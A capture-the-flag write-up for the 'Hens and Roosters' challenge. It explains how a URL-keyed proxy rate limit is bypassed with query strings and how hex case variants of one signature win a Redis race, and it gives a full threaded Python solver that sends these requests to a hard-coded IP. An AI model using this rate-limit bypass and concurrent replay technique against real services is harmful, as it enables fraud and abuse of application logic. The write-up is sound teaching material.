# Hens and Roosters

**Points:** 304
**Category:** crypto / web / medium

## Summary
The service gives each visitor a random `uid`, tracks their stud balance in Redis, and only prints the flag when a user reaches 7 studs. The intended friction is twofold: a proxy rate limit that blocks repeated requests to the same URL, and a UOV signature scheme that appears to only allow two free stud increments.

The actual break is a race condition in the backend plus a cache-key quirk:
- The proxy rate limit is keyed on the full URL, so adding a query string bypasses it.
- `/buy` and `/work` use Redis without atomic locking around the stud check, signature generation, and increment.
- `/work` caches signature lookups by the raw hex string, but verification only cares about the decoded bytes. That means the same valid signature can be replayed under many different hex string case variants, which defeats the per-signature cache.

With one real signature and enough concurrent case variants, the same payload can be verified many times before the first increment wins. That pushes the stud counter to 7 and reveals the flag.

## Service Flow
The backend logic is simple:
- `GET /` generates a random 16-hex-character `uid` and stores it in Redis with 0 studs.
- `GET /buy?uid=...` returns a free signature when the user has 0 studs.
- `POST /work` verifies a signature for the current payload `"<studs>|<uid>"` and increments the stud count if the signature is valid.
- Once studs reaches 7, `/buy` prints the flag.

The proxy configuration in `proxy/haproxy.cfg` is also important:

```haproxy
stick-table type string len 2048 size 100k expire 20s store http_req_rate(20s)
http-request track-sc0 url
http-request deny deny_status 429 if { sc_http_req_rate(0) gt 1 }
```

Because it tracks the full URL, requests like `/buy?uid=...&n=1`, `/buy?uid=...&n=2`, etc. are treated as different URLs and bypass the rate limit.

## Important Backend Bug
The vulnerable part is in `backend/app.py`:

```python
value = r.get(str(sig))
if value is None:
    r.set(sig, b'-', ex=240)
    verified = uov.verify(payload, sig_bytes)
    if verified:
        r.set(sig, payload, ex=240)
elif value == b'-':
    return "The signature is still being processed, please send a request later!"
else:
    verified = value.decode() == payload

if verified:
    studs = r.incr(uid)
```

The Redis cache key is the exact signature string, not the signature bytes. Since the signature parser accepts uppercase and lowercase hex, the same underlying signature can be replayed with different string encodings to evade the cache.

That lets us submit many concurrent `/work` requests using the same real signature bytes, but different cache keys.

## Exploit Strategy
1. Get one fresh `uid` from `/`.
2. Call `/buy?uid=<uid>&x=<n>` once to get a free signature for payload `0|uid`.
3. Generate many case-variant forms of that same signature string.
4. Send those variants concurrently to `/work?y=<n>`.
5. Because each request has a different Redis cache key and the backend is threaded, several requests verify the same payload before the first increment finishes.
6. The stud count climbs to 7, and `/buy` returns the flag.

## Solver Script

```python
#!/usr/bin/env python3
import re
import socket
import threading
import requests

BASE = "http://136.114.129.41"
HOST = "136.114.129.41"


def get_uid():
    text = requests.get(f"{BASE}/?seed=1", timeout=20).text
    return re.search(r"[0-9a-f]{16}", text).group(0)


def get_free_sig(uid):
    # Any query string bypasses the proxy's URL-based rate limit.
    text = requests.get(f"{BASE}/buy?uid={uid}&a=1", timeout=240).text
    match = re.search(r"free signature: ([0-9a-f]+)", text)
    if not match:
        raise RuntimeError(f"failed to get signature: {text}")
    return match.group(1)


def make_case_variants(sig, count):
    alpha_positions = [i for i, ch in enumerate(sig) if ch.isalpha()]
    variants = []
    for i in range(count):
        chars = list(sig)
        for bit in range(min(count, len(alpha_positions))):
            pos = alpha_positions[bit]
            chars[pos] = chars[pos].upper() if ((i >> bit) & 1) else chars[pos].lower()
        variants.append("".join(chars))
    return list(dict.fromkeys(variants))


def send_work(uid, sig, idx):
    body = f'{{"uid":"{uid}","sig":"{sig}"}}'.encode()
    req = (
        f"POST /work?v={idx} HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        f"Content-Type: application/json\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(60)
    sock.connect((HOST, 80))
    sock.sendall(req)

    data = b""
    while True:
        try:
            chunk = sock.recv(8192)
        except Exception:
            break
        if not chunk:
            break
        data += chunk
    sock.close()
    return data.decode("latin1", errors="ignore")


def main():
    uid = get_uid()
    sig = get_free_sig(uid)

    variants = make_case_variants(sig, 12)
    barrier = threading.Barrier(len(variants))
    results = []
    lock = threading.Lock()

    def worker(i, variant):
        barrier.wait()
        resp = send_work(uid, variant, i)
        with lock:
            results.append(resp)

    threads = [threading.Thread(target=worker, args=(i, variant)) for i, variant in enumerate(variants)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    final = requests.get(f"{BASE}/buy?uid={uid}&check=1", timeout=120).text
    print(final)

    for r in results:
        if "stud" in r.lower():
            print(r[:200])


if __name__ == "__main__":
    main()
```

## Result
The final `/buy` response was:

```text
You have 6- wait, no, 7 studs! Here's your lego set: UMASS{oil_does_mix_with_oil_but_roosters_dont}
```

## Flag
`UMASS{oil_does_mix_with_oil_but_roosters_dont}`
